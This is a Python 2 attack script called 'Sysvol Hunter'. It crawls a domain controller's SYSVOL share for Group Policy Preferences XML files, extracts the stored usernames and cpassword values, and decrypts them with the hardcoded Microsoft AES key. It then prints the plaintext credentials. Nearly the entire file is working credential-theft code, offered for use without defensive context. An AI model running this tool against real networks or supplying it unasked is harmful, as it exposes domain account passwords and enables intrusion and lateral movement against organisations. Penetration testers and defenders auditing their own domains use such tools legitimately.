#!/usr/bin/env python
#title           : Sysvol Hunter
#description     : Automate finding and cracking sysvol passwords
#author          : Marouane El-ANBRI (Iron Geek)
#python_version  : 2.7.x
#Usage           : python sysvol_hunter.py DC_IP
 
import os
from sys import argv
from bs4 import BeautifulSoup
from Crypto.Cipher import AES
from base64 import b64decode

print """
   _____                        __   __  __            __           
  / ___/__  ________   ______  / /  / / / /_  ______  / /____  _____
  \__ \/ / / / ___/ | / / __ \/ /  / /_/ / / / / __ \/ __/ _ \/ ___/
 ___/ / /_/ (__  )| |/ / /_/ / /  / __  / /_/ / / / / /_/  __/ /    
/____/\__, /____/ |___/\____/_/  /_/ /_/\__,_/_/ /_/\__/\___/_/     
     /____/                                                         
                             By Genio
"""

script,ip = argv
 
def decrypter(cpassword):
    key = "4e9906e8fcb66cc9faf49310620ffee8f496e806cc057990209b09a433b66c1b".decode('hex')
    cpassword += "=" * ((4 - len(cpassword) % 4) % 4)
    password = b64decode(cpassword)
    plain = AES.new(key, AES.MODE_CBC, "\x00" * 16).decrypt(password)
    plain_fn = plain[:-ord(plain[-1])].decode('utf16')
    return plain_fn
 
print "[+] Searching on %s .... " %ip

path=[]
name=[]
sr_path = r'\\'+ip+r'\sysvol'
for root, dirs, files in os.walk(sr_path):
    for file in files:
        if file.endswith('.xml'):
            path.append(os.path.join(root, file))
            name.append(os.path.basename(file))
        else:
            pass    
for f_name,f_dir in zip(name,path):
    with open(f_dir,"r") as sysvol_file:
        soup_vol = BeautifulSoup(sysvol_file, features="xml")
        prop_tag = soup_vol.Properties
        group_tag = soup_vol.Groups
        
        if prop_tag != None and group_tag != None :
            print "\n[+] %s Contains Password" %f_name
            user_name= prop_tag.attrs['userName']
            cpass = prop_tag.attrs['cpassword']
            fn=decrypter(cpass)
            print "[+] UserName Found     : %s" %user_name
            print "[+] CPassword Found    : %s" %cpass
            print "[+] Password Decrypted : %s" %fn
        else:
            pass
